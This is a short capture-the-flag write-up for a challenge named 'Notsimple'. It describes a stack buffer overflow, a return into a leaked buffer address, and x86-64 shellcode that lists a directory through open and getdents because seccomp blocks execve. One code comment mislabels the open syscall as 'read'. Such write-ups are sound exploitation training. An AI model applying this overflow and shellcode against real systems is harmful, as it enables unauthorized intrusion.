# Notsimple: ret2stack + seccomp bypass + write ls in asm

There is an executable stack
Steps:
1. There is a buffer overflow with 88 offset
2. return to the leaked address(points to the start of the buffer)
3. fill buffer with shellcode to execute the getdents syscall since execve is disallowed

```asm
mov rax, 0x2e   ; '.'
push rax

mov rax, 2      ; read('.',0,0)
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall

mov rdi, rax    ; make space on stack
mov rdx, 0x1000
sub rsp, rdx
mov rsi, rsp
mov rax, 78
syscall         ; getdents(fd, buffer, size)

xchg rax, rdx
mov rax, 1 
mov rdi, 1
mov rsi, rsp    ; write buffer to stdout
syscall
```